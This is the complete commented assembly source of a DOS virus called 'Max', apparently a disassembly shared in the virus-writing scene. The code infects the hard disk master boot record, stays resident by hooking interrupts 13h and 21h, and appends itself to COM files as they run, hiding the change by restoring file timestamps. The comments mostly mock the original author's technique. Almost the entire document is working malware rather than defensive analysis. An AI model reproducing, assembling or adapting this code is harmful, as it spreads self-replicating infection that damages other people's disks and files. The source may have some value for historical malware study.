.model tiny
.286                            ; the foul thing uses 286 instructions!
.code
        org     100h            ; oh, good, this virus will work, then...

; Disassembly of the Max Virus, done by The Attitude Adjuster.
__max:
        call    _getdelta

_storagebuf:
        int     20h
        db      0

_getdelta:
        pop     bp
        push    cs ss                           ; check if loaded
        pop     ax cx                           ; from mbr or file
        xor     cx, ax
        jnz     _yesmbr
         
        mov     ax, 201h                        ; read old mbr
        lea     bx, [bp+ (offset buffer - offset _getdelta)]
        inc     cx
        mov     dx, 80h
        int     13h
                
        cmp     byte ptr es:[bx], 0E8h          ; shitty check for infected
        je      _restore_n_return               ; mbr
                
        mov     ax, 301h                        ; write old mbr on sector 2
        inc     cx
        int     13h
                
        lea     si, [bp - (offset _storagebuf - offset __max)]
        mov     di, bx
        mov     cx, offset endcopy - offset __max
        rep     movsb
                
        mov     ax, 301h                        ; write new mbr to sector 1
        inc     cx
        int     13h

_restore_n_return:
        mov     si, bp
        mov     di, offset __max
        push    di
        movsb
        movsw
        ret
                
vtitle  db      '[Max]'

_yesmbr:
        xor     ax, ax                          ; FOO! cs=0!  push cs/pop ds
        mov     ds, ax
        
        mov     si, 7C00h                       ; mbr loaded at 0:7C00h
        
        mov     ss, ax                          ; who cares?
        mov     sp, si                          ; why bother with the stack?
        
        push    ax                              ; save return values later
        push    si
        
        dec     word ptr ds:[0413h]             ; virus 1K long
        
        int     12h
                
        shl     ax, 6                           ; 286 instruction encoding!
        mov     es, ax                          ; foo foo foo foo!
        
        push    cs
        pop     ds
        
        lea     si, [bp - (offset _storagebuf - offset __max)]
        mov     di, offset 100h
        mov     cx, offset endvirus - offset __max
        rep     movsb
        
        mov     ds, cx
        xchg    ax, word ptr ds:[13h*4+2]
        mov     word ptr es:[offset old13+2], ax
        mov     ax, offset our13
        xchg    ax, word ptr ds:[13h*4]
        mov     word ptr es:[offset old13], ax
        mov     ax, offset hightransfer
        push    es
        push    ax
        retf                                    ; xfer

hightransfer:        
        mov     byte ptr cs:[025Fh], 0
        
        mov     ax, 201h                        ; read sector
        pop     bx                              ; at 0:7C00h
        pop     es
        inc     cx                              ; the old mbr
        inc     cx
        mov     dx, 80h                         ; on HD0
        int     13h
        
        db      0EAh                            ; return to old
        dw      7C00h, 0                        ; mbr

our13:        
        push    ax ds
        sub     ax, ax
        mov     ds, ax
        
        cmp     word ptr es:[bx], 'ZM'          ; check for voodoomajick
        jne     _alreadyvectored                ; at buffer
        
        mov     ax, cs
        cmp     byte ptr cs:[countb], 0         ; already hookered?
        jne     _alreadyvectored
        
        xchg    ax, word ptr ds:[21h*4+2]       ; revector int 21h
        mov     word ptr cs:[old21+2], ax
        mov     ax, offset our21
        xchg    ax, word ptr ds:[21h*4]
        mov     word ptr cs:[old21], ax
        inc     byte ptr cs:[025Fh]

_alreadyvectored:
        pop     ds
        pop     ax
        db      0EAh 
old13   dd      ?

our21:        
        pusha                                   ; brilliant...
        push    ds es
        
        sub     ax, 4B00h
        jnz     _ret_not_us
        
        mov     ax, 3D00h                       ; open file to infect
        int     21h
        xchg    ax, bx
        
        mov     ax, 1220h                       ; get jft for handle
        int     2Fh
        push    bx
        
        mov     ax, 1216h                       ; get sft for jft
        mov     bl, byte ptr es:[di]
        int     2Fh
        pop     bx
        
        or      word ptr es:[di+2], 2           ; set access write on
        
        push    cs
        pop     ds
        
        mov     ah, 3Fh                         ; read first 3 bytes
        mov     cx, 3
        mov     dx, 103h
        int     21h
        
        xchg    dx, si
        
        cmp     word ptr [si], 'ZM'             ; check voodoomajick
        je      _do_not_strub
        
        cmp     word ptr [si], 'MZ'             ; check alternatemajick
        je      _do_not_strub
        
        mov     ax, 4202h                       ; lseek end
        xor     cx, cx                          ; YOU MORON! USE THE SFT!
        cwd
        int     21h
        
        sub     ax, 3                           ; adjust for jmp near
        mov     byte ptr ds:[jmpbld], 0E9h      ; build jmp
        mov     word ptr ds:[jmpbld+1], ax
        
        sub     ax, offset endcopy - offset __max
        xor     ax, word ptr [si+1]             ; already infected?
        jz      _do_not_strub
        
        mov     ah, 40h                         ; write virus
        mov     cx, offset endcopy - offset __max
        mov     dx, offset __max
        int     21h
        
        mov     ax, 4200h                       ; lseek start
        xor     cx, cx                          ; USE SFT, YOU IDIOT!!
        cwd
        int     21h
        
        mov     ah, 40h                         ; write the jmp
        mov     cx, 3
        mov     dx, offset jmpbld
        int     21h
        
        mov     ax, 5701h                       ; fix file time
        mov     cx, es:[di+0Dh]                 ; (i'd use the SFT)
        mov     dx, es:[di+0Fh]
        int     21h

_do_not_strub:
        mov     ah, 3Eh                         ; close file
        int     21h

_ret_not_us:        
        pop     es ds
        popa                                    ; FOOFOOFOO!        
        
        db      0EAh
endcopy:                
old21   dd      ?        
buffer  equ     $ + 0FFH

countb  db      ?
jmpbld  db      3 dup(?)

endvirus:        

        end     __max
        